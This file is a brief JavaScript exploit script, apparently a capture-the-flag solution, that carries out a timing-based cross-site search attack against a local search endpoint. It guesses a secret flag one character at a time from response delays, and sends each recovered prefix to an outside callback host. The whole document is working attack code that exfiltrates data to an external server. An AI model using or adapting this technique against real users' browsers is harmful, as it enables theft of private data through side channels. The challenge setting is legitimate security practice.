async function exploit() {
    const callback_url = "https://hucxxzq.request.dreamhack.games"
    let flag = "scpCTF{"
    const wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
    while(!flag.endsWith("}")){
        for (let word of wordlist){
            let query = flag + word;
            let start = performance.now();
            await fetch(`http://127.0.0.1:12002/search?query=${query}`, {
                mode:"no-cors"
            })
            let end = performance.now();
            let dur = end-start;
            if(dur >= 3000){
                flag = query;
                fetch(`${callback_url}/${flag}`);
                break;
            }
        }
        
    }
    
} exploit();
